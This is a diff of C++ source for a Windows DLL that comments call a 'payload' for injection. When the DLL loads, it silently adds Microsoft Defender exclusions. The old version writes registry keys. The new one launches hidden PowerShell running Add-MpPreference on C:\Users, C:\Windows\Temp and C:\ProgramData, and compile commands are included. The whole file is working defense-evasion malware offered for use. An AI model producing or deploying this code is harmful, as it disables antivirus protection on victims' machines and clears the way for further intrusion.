@@ -1,45 +1,37 @@
 #include <windows.h>
 
-// DLL version — runs exclusion on DllMain attach
-// For use with reflective injection or standard LoadLibrary
-// Requires: Admin or SYSTEM in target process
+// DLL payload - adds Defender exclusions via Add-MpPreference
+// Runs on DllMain attach, spawns hidden PowerShell
+// Compile: cl exclusion_dll.cpp advapi32.lib /LD /Fe:exclusion.dll /EHsc /nologo
 
-bool AddDefenderExclusion(const wchar_t* path) {
-    HKEY hKey;
-    LSTATUS status = RegOpenKeyExW(
-        HKEY_LOCAL_MACHINE,
-        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
-        0,
-        KEY_SET_VALUE,
-        &hKey
-    );
+void AddExclusion(const wchar_t* path) {
+    wchar_t cmd[512];
+    swprintf_s(cmd, 512,
+        L"powershell -WindowStyle Hidden -NonInteractive -Command \"Add-MpPreference -ExclusionPath '%s'\"",
+        path);
 
-    if (status != ERROR_SUCCESS) return false;
+    STARTUPINFOW si = { sizeof(si) };
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    PROCESS_INFORMATION pi = {};
 
-    DWORD val = 0;
-    status = RegSetValueExW(
-        hKey,
-        path,
-        0,
-        REG_DWORD,
-        (BYTE*)&val,
-        sizeof(DWORD)
-    );
-
-    RegCloseKey(hKey);
-    return status == ERROR_SUCCESS;
+    if (CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 10000);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
-        AddDefenderExclusion(L"C:\\");
-        AddDefenderExclusion(L"C:\\Users");
-        AddDefenderExclusion(L"C:\\Windows\\Temp");
+
+        // Add exclusions via legitimate Defender API
+        AddExclusion(L"C:\\Users");
+        AddExclusion(L"C:\\Windows\\Temp");
+        AddExclusion(L"C:\\ProgramData");
     }
     return TRUE;
 }
 
-// Compile as DLL:
-//   MSVC:  cl /LD exclusion_dll.cpp advapi32.lib /Fe:exclusion.dll
-//   MinGW: g++ -shared -o exclusion.dll exclusion_dll.cpp -ladvapi32
+// Compile: cl exclusion_dll.cpp advapi32.lib /LD /Fe:exclusion.dll /EHsc /nologo
